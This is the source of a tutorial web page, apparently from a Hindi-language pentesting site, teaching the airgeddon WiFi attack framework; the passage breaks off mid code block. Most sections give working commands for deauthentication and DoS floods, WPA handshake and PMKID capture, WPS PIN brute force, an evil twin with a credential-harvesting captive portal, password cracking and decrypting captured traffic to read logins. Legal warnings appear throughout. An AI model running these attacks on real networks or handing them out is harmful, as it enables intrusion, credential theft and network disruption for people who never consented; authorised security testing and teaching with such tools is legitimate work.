import TutorialLayout from '../../components/TutorialLayout'
import CodeBlock from '../../components/CodeBlock'

export default function Airgeddon() {
  return (
    <TutorialLayout
      title="airgeddon"
      subtitle="ऑल-इन-वन वाईफाई सुरक्षा ऑडिटिंग फ्रेमवर्क"
      icon="✈️"
      prev={{ to: '/tool/medusa', label: 'medusa' }}
      next={{ to: '/tool/hping3', label: 'hping3' }}
    >
      <h2>What is Airgeddon?</h2>
      <p>
        Airgeddon एक मल्टी-यूज़ बैश स्क्रिप्ट है जो वाईफाई सुरक्षा ऑडिटिंग के लिए सब कुछ एक जगह लाता है। WPA/WPA2 हैंडशेप कैप्चर, इविल ट्विन अटैक, डीऑथेंटिकेशन, WPS अटैक, PMKID कैप्चर — सब एक टूल में। यह बहुत इंटरैक्टिव है और मेन्यू-बेस्ड इंटरफेस है जिससे शुरुआती लोगों के लिए भी इस्तेमाल करना आसान हो जाता है।
      </p>
      <p>
        Airgeddon को v1s1t0r ने बनाया है और यह गिटहब पर ओपन सोर्स उपलब्ध है। यह काली लिनक्स और काली नेटहंटर दोनों पर चलता है। इसकी सबसे बड़ी खासियत यह है कि यह कई अलग-अलग टूल्स को एक साथ इंटीग्रेट करता है — aircrack-ng, hostapd, dnsmasq, reaver, bully, hcxdumptool, hashcat — सब एक ही मेन्यू से एक्सेस होते हैं।
      </p>
      <p>
        यह टूल शुरुआती लोगों के लिए इसलिए परफेक्ट है क्योंकि सब कुछ मेन्यू से होता है — मैन्युअल कमांड्स याद रखने की ज़रूरत नहीं। एडवांस्ड यूज़र्स के लिए भी पावरफुल फीचर्स हैं। Airgeddon वाईफाई सुरक्षा परीक्षण को बहुत आसान बना देता है — आपको बस मेन्यू में से ऑप्शन सेलेक्ट करना है और बाकी सब Airgeddon खुद करता है।
      </p>
      <p>
        Airgeddon का मेन्यू सिस्टम बहुत अच्छी तरह से डिज़ाइन किया गया है। हर स्टेप पर आपको गाइड किया जाता है। पहले इंटरफेस सेलेक्ट करना, फिर मॉनिटर मोड इनेबल करना, फिर टार्गेट स्कैन करना, फिर अटैक टाइप चुनना — सब कुछ स्टेप बाय स्टेप होता है। हर स्टेप पर Airgeddon ज़रूरी जानकारी दिखाता है और आपको गाइड करता है।
      </p>
      <p>
        Airgeddon मल्टी-लैंग्वेज सपोर्ट करता है — अंग्रेज़ी, स्पेनिश, फ्रेंच, जर्मन, और कई और भाषाएं। यह क्रॉस-प्लेटफॉर्म है — लिनक्स पर सबसे अच्छा काम करता है लेकिन विंडोज़ और मैक पर भी चल सकता है (कुछ सीमित फीचर्स के साथ)।
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> केवल अपने वाईफाई नेटवर्क या जिस पर आपको लिखित अनुमति मिली हो उसी की टेस्टिंग करें। बिना अनुमति के किसी भी वाईफाई नेटवर्क पर अटैक करना अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत इसमें 3 साल तक की जेल और 2 लाख तक का जुर्माना हो सकता है। हमेशा लिखित अनुमति लें और केवल शैक्षिक उद्देश्यों के लिए ही इस टूल का उपयोग करें।
      </div>

      <h2>History of Airgeddon</h2>
      <p>
        Airgeddon को v1s1t0r (GitHub username) ने 2016 में बनाया था। शुरू में यह सिर्फ एक सिंपल बैश स्क्रिप्ट था जो aircrack-ng कमांड्स को ऑटोमैट करती थी। लेकिन जल्द ही इसमें कई एडवांस्ड फीचर्स जुड़ते गए — इविल ट्विन, WPS अटैक, PMKID कैप्चर, कैप्टिव पोर्टल। 2018 तक यह काली लिनक्स में शामिल हो गया और WiFi सिक्योरिटी टेस्टिंग का पसंदीदा टूल बन गया।
      </p>
      <p>
        Airgeddon का डेवलपमेंट बहुत एक्टिव रहा है। हर महीने नए फीचर्स और बग फिक्स आते हैं। GitHub पर इसके 5000+ stars हैं और 100+ contributors हैं। 2019 में PMKID अटैक सपोर्ट जोड़ा गया जो बिना क्लाइंट के WiFi पासवर्ड निकाल सकता है। 2020 में DoS अटैक मॉड्यूल अपडेट किया गया। 2021 में Evil Twin अटैक को बेहतर बनाया गया — अब कस्टम कैप्टिव पोर्टल बना सकते हैं।
      </p>
      <p>
        Airgeddon की सबसे बड़ी खासियत इसका मेन्यू-बेस्ड इंटरफेस है। बाकी WiFi टूल्स कमांड लाइन पर चलते हैं — Airgeddon में सब मेन्यू से होता है। यह शुरुआती लोगों के लिए बहुत अच्छा है। एडवांस्ड यूज़र्स भी इसे पसंद करते हैं क्योंकि यह सब कुछ एक जगह लाता है — aircrack-ng, hashcat, reaver, bully, hcxdumptool, hostapd — सब एक मेन्यू में।
      </p>
      <p>
        Airgeddon का कोड बेस बैश में लिखा गया है जिससे यह हर लिनक्स डिस्ट्रो पर चलता है। इसमें Python, Perl, या Ruby की ज़रूरत नहीं — बस बैश और कुछ टूल्स। यह इसे बहुत पोर्टेबल बनाता है। आप किसी भी लिनक्स सिस्टम पर 5 मिनट में Airgeddon सेटअप कर सकते हैं।
      </p>

      <h2>Prerequisites</h2>
      <p>
        Airgeddon इस्तेमाल करने से पहले आपको कुछ चीज़ों की ज़रूरत होगी।
      </p>
      <p>
        Airgeddon इस्तेमाल करने से पहले आपको कुछ चीज़ों की ज़रूरत होगी। सबसे पहले आपके पास एक वाईफाई एडाप्टर होना चाहिए जो मॉनिटर मोड सपोर्ट करता हो। ज़्यादातर एंड्रॉइड फोन के बिल्ट-इन वाईफाई चिप मॉनिटर मोड सपोर्ट नहीं करते, इसलिए आपको एक बाहरी USB वाईफाई एडाप्टर चाहिए होगा जो OTG केबल से फोन से कनेक्ट होगा।
      </p>
      <p>
        Alfa AWUS036ACH या TP-Link TL-WN722N v1 शुरुआती लोगों के लिए सबसे अच्छे विकल्प हैं। ये एडाप्टर मॉनिटर मोड और पैकेट इंजेक्शन दोनों सपोर्ट करते हैं। अगर आप इविल ट्विन अटैक करना चाहते हैं तो आपको दो वाईफाई एडाप्टर चाहिए — एक मॉनिटर मोड के लिए और दूसरा इंटरनेट कनेक्शन के लिए।
      </p>
      <p>
        इसके अलावा आपके सिस्टम में कुछ ज़रूरी पैकेज इंस्टॉल होने चाहिए — aircrack-ng सूट, hostapd, dnsmasq, reaver, bully, hcxdumptool, hashcat। काली लिनक्स और काली नेटहंटर में ये सब पहले से इंस्टॉल होते हैं। अगर कोई पैकेज मिसिंग है तो Airgeddon खुद बताएगा और इंस्टॉल करने में मदद करेगा।
      </p>

      <CodeBlock
        title="सिस्टम आवश्यकताएं"
        code={`# काली नेटहंटर में Airgeddon चेक करें:
which airgeddon
# ya
locate airgeddon.sh

# गिटहब से डाउनलोड करें:
git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git

# डायरेक्टरी में जाएं:
cd airgeddon

# चेक करें कि फाइल है:
ls -la airgeddon.sh

# डिपेंडेंसी चेक करें:
bash airgeddon.sh --help

# सभी ज़रूरी पैकेज चेक करें:
which aircrack-ng
which hostapd
which dnsmasq
which reaver
which bully
which hcxdumptool
which hashcat`}
      />

      <CodeBlock
        title="डिपेंडेंसी इंस्टॉल करें"
        code={`# सभी डिपेंडेंसी एक साथ इंस्टॉल करें:
sudo apt update
sudo apt install -y aircrack-ng hostapd dnsmasq reaver bully \
  hcxdumptool hcxtools hashcat john crunch \
  isc-dhcp-server lighttpd ettercap-text-only \
  xterm mdk4 pixiewps asleap

# अगर कोई पैकेज नहीं मिल रहा:
sudo apt search aircrack-ng
sudo apt search hostapd

# गिटहब से लेटेस्ट वर्जन:
git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
cd airgeddon
sudo bash airgeddon.sh`}
      />

      <div className="warning-box mb-6">
        <strong>⚠️ महत्वपूर्ण चेतावनी:</strong> Airgeddon को रूट (root) प्रिविलेज के साथ चलाना ज़रूरी है। बिना root के यह काम नहीं करेगा। काली नेटहंटर में आप पहले से root होते हैं। अगर काली लिनक्स पर काम कर रहे हैं तो sudo इस्तेमाल करें। root प्रिविलेज बिना मॉनिटर मोड, पैकेट इंजेक्शन, और नेटवर्क कॉन्फ़िगरेशन संभव नहीं है।
      </div>

      <h2>Getting Started with Airgeddon</h2>
      <p>
        Airgeddon शुरू करना बहुत आसान है। बस एक कमांड चलानी है और मेन्यू खुल जाएगा। मेन्यू में से आप अपनी ज़रूरत के हिसाब से ऑप्शन सेलेक्ट कर सकते हैं। हर ऑप्शन के बारे में विस्तार से जानकारी दी गई होती है।
      </p>

      <CodeBlock
        title="Airgeddon लॉन्च करें"
        code={`# Airgeddon डायरेक्टरी में जाएं:
cd airgeddon

# रूट के रूप में शुरू करें:
sudo bash airgeddon.sh

# या सीधे:
sudo ./airgeddon.sh

# पहली बार चलाने पर:
# - डिपेंडेंसी चेक होगी
# - नेटवर्क इंटरफेस डिटेक्ट होंगे
# - वाईफाई एडाप्टर लिस्ट दिखेगी
# - मेन्यू खुलेगा`}
      />

      <h2>Main Menu Options</h2>
      <p>
        Airgeddon का मुख्य मेन्यू कई ऑप्शन्स में बंटा हुआ है। हर ऑप्शन एक विशेष काम करता है। आइए हर ऑप्शन को विस्तार से समझते हैं। मेन्यू में नेविगेट करने के लिए नंबर टाइप करें और एंटर दबाएं।
      </p>

      <CodeBlock
        title="मेन्यू संरचना"
        code={`# Airgeddon मुख्य मेन्यू:

# [1] वाईफाई इंटरफेस सेलेक्ट करें
#     - सभी वाईफाई इंटरफेस दिखते हैं
#     - जैसे wlan0, wlan1 आदि

# [2] मॉनिटर मोड इनेबल करें
#     - चुने हुए इंटरफेस को मॉनिटर मोड में डालता है
#     - wlan0mon जैसा नया इंटरफेस बनता है

# [3] टार्गेट नेटवर्क स्कैन करें
#     - आसपास के सभी वाईफाई नेटवर्क्स दिखते हैं
#     - SSID, BSSID, चैनल, एन्क्रिप्शन सब दिखता है

# [4] अटैक टाइप सेलेक्ट करें
#     - हैंडशेप कैप्चर
#     - PMKID कैप्चर
#     - इविल ट्विन अटैक
#     - डीऑथेंटिकेशन
#     - WPS PIN अटैक
#     - DoS अटैक

# [5] हैंडशेप क्रैक करें
#     - aircrack-ng से डिक्शनरी अटैक
#     - hashcat से GPU क्रैकिंग
#     - john से क्रैकिंग`}
      />

      <h2>Step 1: Select Interface</h2>
      <p>
        Airgeddon शुरू करने के बाद सबसे पहले आपको वाईफाई इंटरफेस सेलेक्ट करना होगा। Airgeddon ऑटोमैटिकली सभी उपलब्ध वाईफाई इंटरफेस डिटेक्ट करता है और लिस्ट दिखाता है। आपको बस अपने एडाप्टर का नंबर टाइप करना है।
      </p>
      <p>
        अगर आपके पास दो वाईफाई एडाप्टर हैं तो आप दोनों को सेलेक्ट कर सकते हैं — एक मॉनिटर मोड के लिए और दूसरा इंटरनेट कनेक्शन के लिए। इविल ट्विन अटैक में दो एडाप्टर की ज़रूरत होती है।
      </p>

      <CodeBlock
        title="इंटरफेस जानकारी"
        code={`# सभी नेटवर्क इंटरफेस देखें:
iwconfig

# वाईफाई इंटरफेस लिस्ट:
iw dev

# USB डिवाइस चेक करें:
lsusb

# ड्राइवर जानकारी:
dmesg | tail -20

# Airgeddon में:
# मेन्यू में [1] दबाएं
# इंटरफेस लिस्ट दिखेगी
# अपने एडाप्टर का नंबर टाइप करें`}
      />

      <h2>Step 2: Monitor Mode</h2>
      <p>
        इंटरफेस सेलेक्ट करने के बाद Airgeddon उसे मॉनिटर मोड में डाल देता है। मॉनिटर मोड में एडाप्टर आसपास के सभी वाईफाई पैकेट्स को सुनता है — किसी विशेष नेटवर्क से कनेक्ट नहीं होता। यह वाईफाई सुरक्षा परीक्षण का सबसे महत्वपूर्ण कदम है।
      </p>

      <CodeBlock
        title="मॉनिटर मोड"
        code={`# Airgeddon में:
# मेन्यू में [2] दबाएं — मॉनिटर मोड इनेबल होगा

# मैन्युअली मॉनिटर मोड:
sudo airmon-ng start wlan0

# या मैन्युअली:
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# चेक करें:
iwconfig
# wlan0mon दिखना चाहिए

# अगर एरर आए:
sudo airmon-ng check kill
sudo airmon-ng start wlan0`}
      />

      <div className="warning-box mb-6">
        <strong>⚠️ चेतावनी:</strong> मॉनिटर मोड इनेबल करने पर आपका वाईफाई कनेक्शन टूट जाएगा। अगर आप इंटरनेट इस्तेमाल कर रहे हैं तो पहले ज़रूरी काम पूरे कर लें। इविल ट्विन अटैक में दूसरे एडाप्टर से इंटरनेट चल सकता है।
      </div>

      <h2>Step 3: Target Scan</h2>
      <p>
        मॉनिटर मोड सक्षम होने के बाद Airgeddon आसपास के सभी वाईफाई नेटवर्क्स को स्कैन करता है। स्कैन में नेटवर्क का नाम (SSID), BSSID (मैक एड्रेस), चैनल, एन्क्रिप्शन टाइप, सिग्नल स्ट्रेंथ, और कनेक्टेड क्लाइंट्स सब दिखता है। आपको बस अपना टार्गेट नेटवर्क सेलेक्ट करना है।
      </p>

      <CodeBlock
        title="नेटवर्क स्कैनिंग"
        code={`# Airgeddon में:
# मेन्यू में [3] दबाएं — नेटवर्क स्कैन शुरू होगा

# मैन्युअली स्कैन:
sudo airodump-ng wlan0mon

# आउटपुट में दिखेगा:
# BSSID = एक्सेस पॉइंट का मैक एड्रेस
# PWR = सिग्नल स्ट्रेंथ
# CH = चैनल नंबर
# ENC = एन्क्रिप्शन (WPA2, WPA, WEP)
# ESSID = नेटवर्क का नाम

# विशेष चैनल पर स्कैन:
sudo airodump-ng -c 6 wlan0mon

# 5GHz भी स्कैन करें:
sudo airodump-ng --band abg wlan0mon`}
      />

      <h2>Step 4: Choose Attack Type</h2>
      <p>
        टार्गेट सेलेक्ट करने के बाद Airgeddon कई तरह के अटैक ऑप्शन दिखाता है। हर अटैक का अपना फायदा है। आप अपनी ज़रूरत के हिसाब से अटैक चुन सकते हैं। आइए हर अटैक को विस्तार से समझते हैं।
      </p>

      <h2>Handshake Capture Attack</h2>
      <p>
        हैंडशेप कैप्चर सबसे आम अटैक है। इसमें WPA/WPA2 हैंडशेप कैप्चर किया जाता है जब कोई क्लाइंट नेटवर्क से कनेक्ट होता है। बाद में इस हैंडशेप को डिक्शनरी अटैक से क्रैक किया जाता है। Airgeddon यह पूरा प्रोसेस ऑटोमैटिक कर देता है।
      </p>

      <CodeBlock
        title="WPA/WPA2 हैंडशेप कैप्चर"
        code={`# Airgeddon में:
# मेन्यू → हैंडशेप कैप्चर → टार्गेट सेलेक्ट → कैप्चर शुरू

# मैन्युअली aircrack-ng से:
# टर्मिनल 1 — कैप्चर:
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# टर्मिनल 2 — डीऑथेंटिकेशन:
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# हैंडशेप चेक करें:
aircrack-ng capture-01.cap

# हैंडशेप मिलने पर:
# "WPA handshake: AA:BB:CC:DD:EE:FF" दिखेगा`}
      />

      <p>
        हैंडशेप कैप्चर करने के लिए टार्गेट नेटवर्क से कोई क्लाइंट कनेक्टेड होना चाहिए। अगर कोई क्लाइंट नहीं है तो आपको डीऑथेंटिकेशन अटैक चलाना पड़ेगा ताकि क्लाइंट डिस्कनेक्ट हो और दोबारा कनेक्ट हो — तभी हैंडशेप कैप्चर होगा। Airgeddon यह सब ऑटोमैटिक करता है।
      </p>

      <CodeBlock
        title="डीऑथेंटिकेशन अटैक"
        code={`# Airgeddon में:
# मेन्यू → डीऑथेंटिकेशन → टार्गेट सेलेक्ट → अटैक शुरू

# मैन्युअली:
# सभी क्लाइंट्स को डिस्कनेक्ट करवाएं:
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# विशेष क्लाइंट को डिस्कनेक्ट:
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# लगातार डीऑथेंटिकेशन:
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Ctrl+C से बंद करें`}
      />

      <h2>PMKID Capture Attack</h2>
      <p>
        PMKID अटैक एक नई तकनीक है जिसमें किसी क्लाइंट की ज़रूरत नहीं होती। यह अटैक सीधे एक्सेस पॉइंट से PMKID कैप्चर करता है और फिर उसे क्रैक करता है। यह hcxdumptool और hashcat के साथ किया जाता है।
      </p>
      <p>
        PMKID अटैक का सबसे बड़ा फायदा यह है कि इसमें किसी क्लाइंट के कनेक्ट होने का इंतज़ार नहीं करना पड़ता। आप सीधे एक्सेस पॉइंट से PMKID कैप्चर कर सकते हैं। हालांकि, सभी एक्सेस पॉइंट्स PMKID सपोर्ट नहीं करते — लेकिन ज़्यादातर मॉडर्न राउटर्स में यह मिल जाता है।
      </p>

      <CodeBlock
        title="PMKID कैप्चर"
        code={`# Airgeddon में:
# मेन्यू → PMKID कैप्चर → टार्गेट सेलेक्ट → कैप्चर शुरू

# मैन्युअली hcxdumptool से:
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --filterlist_ap=AA:BB:CC:DD:EE:FF --filtermode=2

# सभी AP के लिए:
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng

# PMKID निकालें:
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng

# hashcat से क्रैक:
hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt

# या aircrack-ng से:
aircrack-ng pmkid.hc22000 -w /usr/share/wordlists/rockyou.txt`}
      />

      <div className="warning-box mb-6">
        <strong>⚠️ चेतावनी:</strong> PMKID अटैक सभी राउटर्स पर काम नहीं करता। कुछ पुराने राउटर्स PMKID सपोर्ट नहीं करते। अगर PMKID नहीं मिल रहा है तो पारंपरिक हैंडशेप कैप्चर विधि इस्तेमाल करें।
      </div>

      <h2>Evil Twin Attack</h2>
      <p>
        इविल ट्विन अटैक में हम टार्गेट नेटवर्क की नकल करके एक फेक एक्सेस पॉइंट बनाते हैं। जब यूज़र फेक AP से कनेक्ट हो जाता है तो हम उसका ट्रैफिक इंटरसेप्ट कर सकते हैं। यह सोशल इंजीनियरिंग अटैक है और बहुत प्रभावी है।
      </p>
      <p>
        Airgeddon इविल ट्विन अटैक को बहुत आसान बना देता है। यह ऑटोमैटिकली फेक AP बनाता है, डीऑथेंटिकेशन अटैक चलाता है, कैप्टिव पोर्टल सेटअप करता है, और क्रेडेंशियल्स कैप्चर करता है। आपको बस मेन्यू में से ऑप्शन सेलेक्ट करना है।
      </p>
      <p>
        इविल ट्विन अटैक में दो वाईफाई एडाप्टर की ज़रूरत होती है — एक फेक AP बनाने के लिए और दूसरा इंटरनेट कनेक्शन के लिए। अगर आपके पास एक ही एडाप्टर है तो भी अटैक हो सकता है लेकिन इंटरनेट नहीं चलेगा — जिससे शक हो सकता है।
      </p>

      <CodeBlock
        title="इविल ट्विन अटैक"
        code={`# Airgeddon में:
# मेन्यू → इविल ट्विन → टार्गेट सेलेक्ट → अटैक शुरू

# Airgeddon ऑटोमैटिक करेगा:
# 1. फेक AP बनाएगा (hostapd से)
# 2. DHCP सर्वर चलाएगा (dnsmasq से)
# 3. डीऑथेंटिकेशन अटैक चलाएगा
# 4. कैप्टिव पोर्टल दिखाएगा
# 5. क्रेडेंशियल्स कैप्चर करेगा

# मैन्युअली:
# टर्मिनल 1 — फेक AP:
sudo airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# टर्मिनल 2 — इंटरफेस:
sudo ifconfig at0 192.168.1.1 netmask 255.255.255.0 up

# टर्मिनल 3 — DHCP:
sudo dnsmasq --interface=at0 --dhcp-range=192.168.1.10,192.168.1.50,12h

# टर्मिनल 4 — डीऑथेंटिकेशन:
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon`}
      />

      <h3>Captive Portal Attack</h3>
      <p>
        कैप्टिव पोर्टल अटैक में जब विक्टिम फेक AP से कनेक्ट होता है तो उसे एक फेक लॉगिन पेज दिखता है जो ओरिजिनल AP के लॉगिन पेज जैसा दिखता है। विक्टिम अपना पासवर्ड डालता है और वह हमारे पास आ जाता है। यह अटैक बहुत प्रभावी है क्योंकि ज़्यादातर लोग पब्लिक वाईफाई पर पासवर्ड डालने में संकोच नहीं करते।
      </p>

      <CodeBlock
        title="कैप्टिव पोर्टल"
        code={`# Airgeddon में:
# इविल ट्विन → कैप्टिव पोर्टल → टेम्पलेट सेलेक्ट

# Airgeddon कई तरह के पोर्टल टेम्पलेट देता है:
# - जेनेरिक लॉगिन पेज
# - वाईफाई पासवर्ड पेज
# - सोशल लॉगिन (Facebook, Google)
# - कस्टम पेज

# कैप्चर किए गए क्रेडेंशियल्स:
# /tmp/airgeddoncaptures/ में सेव होते हैं

# लाइव देखें:
tail -f /tmp/airgeddoncaptures/captured.txt`}
      />

      <div className="warning-box mb-6">
        <strong>⚠️ गंभीर चेतावनी:</strong> कैप्टिव पोर्टल अटैक सोशल इंजीनियरिंग है। इसका इस्तेमाल केवल अपने नेटवर्क पर टेस्ट करने के लिए करें। बिना अनुमति के दूसरों के क्रेडेंशियल्स चुराना गंभीर अपराध है।
      </div>

      <h2>WPS Attack</h2>
      <p>
        WPS (Wi-Fi Protected Setup) एक फीचर है जो वाईफाई कनेक्शन को आसान बनाता है — लेकिन इसमें सुरक्षा कमज़ोरियां हैं। WPS PIN अटैक में 8-डिजिट PIN को ब्रूट फोर्स किया जाता है। Airgeddon reaver और bully दोनों से WPS अटैक कर सकता है।
      </p>

      <CodeBlock
        title="WPS अटैक"
        code={`# Airgeddon में:
# मेन्यू → WPS अटैक → टार्गेट सेलेक्ट → अटैक शुरू

# मैन्युअली:
# WPS-enabled नेटवर्क्स स्कैन:
sudo wash -i wlan0mon

# Reaver से WPS PIN अटैक:
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv

# Pixie Dust अटैक (तेज़):
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -K 1

# Bully से:
sudo bully -b AA:BB:CC:DD:EE:FF -c 6 -d wlan0mon

# Bully से Pixie Dust:
sudo bully -b AA:BB:CC:DD:EE:FF -c 6 -d wlan0mon -p 1`}
      />

      <p>
        WPS PIN अटैक में 8-डिजिट PIN को ब्रूट फोर्स किया जाता है। पहले 4 डिजिट और बाद के 4 डिजिट अलग-अलग चेक होते हैं — इसलिए कुल 11,000 कॉम्बिनेशन टेस्ट होते हैं। सामान्यतः कुछ घंटों में PIN मिल जाता है। Pixie Dust अटैक में कुछ ही सेकंड में PIN मिल सकता है — लेकिन यह सभी राउटर्स पर काम नहीं करता।
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ चेतावनी:</strong> WPS अटैक सभी राउटर्स पर काम नहीं करता। ज़्यादातर नए राउटर्स में WPS लॉक-आउट फीचर होता है जो कई गलत प्रयासों के बाद WPS को डिसेबल कर देता है। अगर WPS लॉक हो जाए तो कुछ मिनट इंतज़ार करें।
      </div>

      <h2>DoS (Denial of Service) Attack</h2>
      <p>
        DoS अटैक में नेटवर्क को इस तरह से ओवरलोड किया जाता है कि वह काम करना बंद कर दे। Airgeddon कई तरह के DoS अटैक सपोर्ट करता है — डीऑथेंटिकेशन फ्लड, डिसएसोसिएशन फ्लड, और MDK4 अटैक। ये अटैक नेटवर्क की उपलब्धता को प्रभावित करते हैं।
      </p>

      <CodeBlock
        title="DoS अटैक"
        code={`# Airgeddon में:
# मेन्यू → DoS अटैक → अटैक टाइप सेलेक्ट

# मैन्युअली:
# डीऑथेंटिकेशन फ्लड:
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# MDK4 डीऑथेंटिकेशन:
sudo mdk4 wlan0mon d -B AA:BB:CC:DD:EE:FF

# MDK4 डिसएसोसिएशन:
sudo mdk4 wlan0mon a -B AA:BB:CC:DD:EE:FF

# बीकन फ्लड:
sudo mdk4 wlan0mon b -n "FakeNetwork" -c 6`}
      />

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> DoS अटैक अवैध हैं। केवल अपने नेटवर्क पर टेस्ट करें। दूसरों के नेटवर्क पर DoS अटैक करना साइबर अपराध है और गंभीर कानूनी परिणाम हो सकते हैं।
      </div>

      <h2>Handshake Cracking</h2>
      <p>
        हैंडशेप कैप्चर करने के बाद अगला कदम है पासवर्ड क्रैक करना। Airgeddon में बिल्ट-इन क्रैकिंग ऑप्शन है जो aircrack-ng, hashcat, और john the ripper तीनों से क्रैक कर सकता है। आप अपनी ज़रूरत के हिसाब से क्रैकिंग टूल चुन सकते हैं।
      </p>

      <CodeBlock
        title="हैंडशेप क्रैकिंग"
        code={`# Airgeddon में:
# मेन्यू → हैंडशेप क्रैक → टूल सेलेक्ट → वर्डलिस्ट सेलेक्ट

# aircrack-ng से:
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt

# hashcat से (GPU):
# पहले हैंडशेप को hashcat फॉर्मेट में बदलें:
aircrack-ng -j hashcat_capture capture-01.cap
# फिर क्रैक करें:
hashcat -m 2500 hashcat_capture.hccapx /usr/share/wordlists/rockyou.txt

# John the Ripper से:
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# क्रैक्ड पासवर्ड देखें:
john --show hash.txt`}
      />

      <h2>Wordlist Generation</h2>
      <p>
        पासवर्ड क्रैकिंग में वर्डलिस्ट की गुणवत्ता बहुत महत्वपूर्ण है। अगर पासवर्ड वर्डलिस्ट में नहीं है तो क्रैक नहीं होगा। Airgeddon कई वर्डलिस्ट ऑप्शन देता है — आप डिफ़ॉल्ट वर्डलिस्ट इस्तेमाल कर सकते हैं या अपनी कस्टम वर्डलिस्ट बना सकते हैं।
      </p>

      <CodeBlock
        title="वर्डलिस्ट जनरेटर"
        code={`# Airgeddon में वर्डलिस्ट ऑप्शन:
# मेन्यू → क्रैकिंग → वर्डलिस्ट सेलेक्ट

# crunch से वर्डलिस्ट बनाएं:
crunch 8 8 0123456789 -o numbers.txt

# कॉम्बिनेशन:
crunch 10 10 -t @@@@@@%%%% -o combo.txt

# cewl से वेबसाइट से शब्द:
cewl http://target.com -w target_words.txt

# ऑनलाइन वर्डलिस्ट डाउनलोड:
wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/WPA-2018-12.txt.gz
gunzip WPA-2018-12.txt.gz

# कस्टम वर्डलिस्ट:
# टार्गेट के नाम, जन्मतिथि, फोन नंबर से बनाएं`}
      />

      <h2>Airdecap — Traffic Decryption</h2>
      <p>
        जब आपके पास पासवर्ड मिल जाता है तो आप कैप्चर किए गए ट्रैफिक को डिक्रिप्ट कर सकते हैं। Airgeddon में एयरडेकैप ऑप्शन है जो डिक्रिप्शन करता है। डिक्रिप्टेड ट्रैफिक में यूज़र का ब्राउज़िंग इतिहास, लॉगिन क्रेडेंशियल्स, और दूसरी संवेदनशील जानकारी हो सकती है।
      </p>

      <CodeBlock
        title="ट्रैफिक डिक्रिप्शन"
        code={`# Airgeddon में:
# मेन्यू → एयरडेकैप → कैप्चर फाइल → पासवर्ड → डिक्रिप्ट

# मैन्युअली:
# WPA/WPA2 डिक्रिप्शन:
airdecap-ng -e "NetworkName" -p "password123" capture-01.cap

# WEP डिक्रिप्शन:
airdecap-ng -w HEX_KEY capture-01.cap

# डिक्रिप्टेड फाइल: capture-01-dec.cap

# Wireshark में खोलें:
wireshark capture-01-dec.cap

# tshark से देखें:
tshark -r capture-01-dec.cap -Y "http"

# DNS क्वेरीज़:
tshark -r capture-01-dec.cap -Y "dns"

# लॉगिन क्रेडेंशियल्स:
tshark -r capture-01-dec.cap -Y "http.request.method == POST"`}
      />

      <h2>Troubleshooting</h2>
      <p>
        Airgeddon इस्तेमाल करते समय कई तरह की समस्याएं आ सकती हैं। आइए सबसे आम समस्याओं और उनके समाधान के बारे में जानते हैं।
      </p>

      <h3>Missing Dependencies</h3>
      <p>
        अगर Airgeddon शुरू करते समय कोई डिपेंडेंसी मिसिंग है तो Airgeddon खुद बताएगा कि कौन सा पैकेज नहीं है। आपको बस वह पैकेज इंस्टॉल करना है। काली लिनक्स में ज़्यादातर पैकेज पहले से होते हैं।
      </p>

      <CodeBlock
        title="डिपेंडेंसी समस्या"
        code={`# डिपेंडेंसी चेक करें:
which aircrack-ng hostapd dnsmasq reaver bully

# मिसिंग पैकेज इंस्टॉल:
sudo apt install aircrack-ng
sudo apt install hostapd dnsmasq
sudo apt install reaver bully
sudo apt install hcxdumptool hcxtools
sudo apt install hashcat john

# Airgeddon दोबारा चलाएं:
sudo bash airgeddon.sh`}
      />

      <h3>Monitor Mode Not Working</h3>
      <p>
        अगर एडाप्टर मॉनिटर मोड नहीं कर पा रहा है तो सबसे पहले चेक करें कि एडाप्टर मॉनिटर मोड सपोर्ट करता है या नहीं। rfkill से चेक करें कि एडाप्टर ब्लॉक तो नहीं है। कभी-कभी ड्राइवर इश्यू भी होते हैं।
      </p>

      <CodeBlock
        title="मॉनिटर मोड ट्रबलशूट"
        code={`# एडाप्टर ब्लॉक है या नहीं:
rfkill list all
sudo rfkill unblock all

# मैन्युअली मॉनिटर मोड:
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# ड्राइवर चेक:
dmesg | tail -20
lsusb -v | grep -A 5 "Wireless"

# एडाप्टर रीस्टार्ट:
sudo airmon-ng stop wlan0mon
sudo airmon-ng start wlan0`}
      />

      <h3>Handshake Not Capturing</h3>
      <p>
        अगर हैंडशेप कैप्चर नहीं हो रहा है तो कई कारण हो सकते हैं। सबसे आम कारण यह है कि टार्गेट नेटवर्क से कोई क्लाइंट कनेक्टेड नहीं है। ऐसे में आपको डीऑथेंटिकेशन अटैक चलाना पड़ेगा। दूसरा कारण यह हो सकता है कि आप गलत चैनल पर हैं।
      </p>

      <CodeBlock
        title="हैंडशेप ट्रबलशूट"
        code={`# सही चैनल पर कैप्चर:
